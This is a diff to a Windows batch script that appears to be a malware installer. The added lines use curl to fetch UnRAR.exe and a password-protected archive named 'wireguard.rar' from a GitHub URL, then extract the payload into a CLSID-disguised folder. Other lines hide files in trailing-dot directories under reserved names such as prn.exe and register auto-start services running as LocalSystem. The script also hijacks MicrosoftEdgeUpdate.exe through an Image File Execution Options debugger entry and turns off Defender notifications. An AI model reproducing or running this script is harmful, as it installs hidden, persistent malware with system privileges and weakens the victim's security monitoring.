@@ -1,11 +1,18 @@
+sc delete Help
 schtasks /Delete /TN "\Windows\Help" /F
-"%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" x -y -o+ -p963258741 "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\guard.rar" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
+
+mkdir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
+dir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" >nul || curl.exe -s -L -o "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" https://github.com/vltex/1/raw/1/r/UnRAR.exe
+dir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" >nul || curl.exe -s -L -o "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" https://github.com/vltex/1/raw/1/r/wireguard.rar
+
+"%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" x -y -o+ -p963258741 "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
 
 mkdir \\.\%ProgramData%\config..\
 mkdir \\.\%ProgramData%\logdata..\
 mkdir %WINDIR%\Setup\Scripts
 
-move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\"
+copy /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\prn.exe"
 move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
 
 move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
@@ -24,7 +31,7 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
 
 sc create Performance binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
-sc create Update binPath="\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini" start="auto" obj="LocalSystem"
+sc create Update binPath="\\.\%ProgramData%\logdata..\prn.exe \\.\%ProgramData%\logdata..\prn.ini" start="auto" obj="LocalSystem"
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start install.exe" /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f /reg:64
